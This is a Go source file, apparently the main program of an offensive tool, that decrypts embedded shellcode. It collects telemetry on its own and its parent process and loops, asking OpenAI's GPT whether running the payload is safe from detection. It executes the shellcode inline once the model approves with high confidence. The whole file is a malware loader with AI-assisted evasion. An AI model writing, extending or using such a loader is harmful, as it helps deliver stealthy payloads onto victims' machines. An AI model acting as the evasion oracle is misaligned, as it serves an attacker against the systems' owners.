package main

import (
	"fmt"
	"halo/ai"
	"halo/logging"
	"halo/shellcode"
	"halo/telemetry"
	"os"
)

func main() {
	openAIKey := os.Getenv("OPENAI_API_KEY")
	if openAIKey == "" {
		logging.LogLine("[-] Missing OPENAI_API_KEY environment variable")
		os.Exit(1)
	}

	logging.InitLog("opsec.log")
	defer logging.CloseLog()

	selfProc, parentProc := telemetry.GetSelfAndParentNames()
	logging.LogLine("[*] AI-powered stealth payload started. Self: " + selfProc + ", Parent: " + parentProc)

	shellcodeBytes, err := shellcode.Decrypt()
	if err != nil || len(shellcodeBytes) == 0 {
		logging.LogLine("[-] Failed to decrypt shellcode or empty.")
		return
	}

	baseline := telemetry.BuildBaseline(selfProc, parentProc)

	for {
		t := telemetry.Collect(baseline, selfProc, parentProc)
		logging.LogLine("[*] Collected telemetry. Querying GPT...")

		resp, err := ai.AskOpenAI(t, openAIKey)
		if err != nil {
			logging.LogLine("[-] Error: " + err.Error())
			continue
		}

		// === Restored 3-step logging from your mycode.go ===
		logging.LogLine(fmt.Sprintf("[*] Decision: %v (confidence %.2f)", resp.Allow, resp.Conf))
		logging.LogLine("[*] Reason: " + resp.Reason)
		logging.LogLine("[*] Thoughts: " + resp.Thoughts)

		if resp.Allow && resp.Conf >= 0.8 {
			logging.LogLine("[+] Execution approved. Launching payload inline.")

			err := shellcode.Execute(shellcodeBytes)
			if err != nil {
				logging.LogLine("[-] Shellcode execution failed: " + err.Error())
			} else {
				logging.LogLine("[+] Shellcode execution returned cleanly.")
			}
			break
		} else {
			logging.LogLine("[-] Still not safe. Will try again.")
		}
	}
}
